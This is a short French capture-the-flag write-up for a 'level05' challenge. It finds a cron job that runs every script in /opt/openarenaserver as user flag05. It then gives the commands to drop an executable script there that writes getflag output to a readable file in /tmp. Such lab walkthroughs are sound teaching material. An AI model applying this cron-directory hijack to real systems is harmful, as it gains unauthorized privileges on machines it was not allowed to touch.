Le dossier de l'utilisateur level05 est vide, on a donc fait une recherche d'un fichier/dossier nommé level05.
`find / -name "level05" 2>/dev/null`

On trouve les résultats suivants (qui sont les mêmes fichiers)
```txt
/var/mail/level05
/rofs/var/mail/level05
```

Le contenu est une tâche cron
`*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`
Le code executé toutes les 2 minutes contenu dans `/usr/sbin/openarenaserver` execute tous les scripts dans `/opt/openarenaserver/*`.

On peut donc créer un fichier qui executera getflag dans ce répertoire, et mettra le résultat dans un dossier ou flag05 et level05 peuvent accéder.
`echo 'getflag > /tmp/flag05; chmod +rw /tmp/flag05' > /opt/openarenaserver/crackflag`
`chmod +x /opt/openarenaserver/crackflag`
